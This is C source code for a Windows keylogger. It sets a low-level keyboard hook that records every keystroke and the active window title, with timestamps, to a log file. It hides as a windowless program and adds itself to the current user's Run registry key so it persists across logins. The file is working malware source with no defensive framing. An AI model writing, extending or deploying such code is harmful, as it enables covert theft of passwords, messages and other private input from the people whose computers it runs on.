#include <Windows.h>
#include <stdio.h>
#include <time.h>
#include <locale.h>

#include "config.h"

static BYTE key_state[256] = {0};
static wchar_t char_buff[2] = {'\0'};
static wchar_t prev_wintitle[256];

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
   
   FILE *fptr = _wfopen(LOG_PATH, L"a, ccs=UTF-16LE");
   
   if (fptr == NULL)
   {
        printf("Error!");
      exit(1);
   }
   
   if (nCode == HC_ACTION)
   {
      switch (wParam)
      {
      case WM_KEYUP:
         // get hook struct
         PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;

         HWND current_window = GetForegroundWindow();
         if (current_window)
         {
            wchar_t curr_wintitle[256];
            GetWindowTextW(current_window, curr_wintitle, 256);

            if (wcscmp(prev_wintitle, curr_wintitle) != 0)
            {
               // Declaring argument for time()
               time_t tt;

               // Declaring variable to store return value of
               // localtime()
               struct tm *ti;

               // Applying time()
               time(&tt);

               // Using localtime()
               ti = localtime(&tt);

               wchar_t dateTime[18];
               wcsftime(dateTime, 18, L"%H:%M:%S %m/%d/%y", ti);

               fwprintf(fptr, L"\n\n[%ls %s]\n", dateTime, curr_wintitle);
            }

            wcscpy(prev_wintitle, curr_wintitle);
         }

         HKL current_layout = GetKeyboardLayout(GetWindowThreadProcessId(current_window, NULL));
         GetKeyboardState(key_state);

         key_state[VK_SHIFT] = GetKeyState(VK_SHIFT);
         key_state[VK_CAPITAL] = GetKeyState(VK_CAPITAL);
         key_state[VK_CONTROL] = GetKeyState(VK_CONTROL);

         int result = ToUnicodeEx(
             (unsigned char)p->vkCode,
             p->scanCode,
             key_state,
             char_buff,
             1,
             0,
             current_layout);

         if (result == 1)
         {
            fwprintf(fptr, L"%s", char_buff);
         }

         break;
      }
   }

   fclose(fptr);
   return CallNextHookEx(NULL, nCode, wParam, lParam);
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd)
{
   setlocale(LC_ALL, ".UTF8");

   HKEY hk;
   DWORD dwSize = MAX_PATH;
   DWORD dwRet;
   
   dwRet = RegCreateKey (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hk);

   if (dwRet == ERROR_SUCCESS)
      RegSetValueExW (hk, REG_KEY, 0, REG_SZ, (LPSTR) EXE_PATH, MAX_PATH);
   else
   {
      fprintf (stderr, "RegCreateKey: %d\n", dwRet);
      exit (1);
   }
   

   // set low level keyboard windows hook
   HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);


   MSG msg;

   while (1)
   {
      while (GetMessage (&msg, NULL, 0, 0))
      {
         DispatchMessage (&msg);
      }
   }

   return (0);
}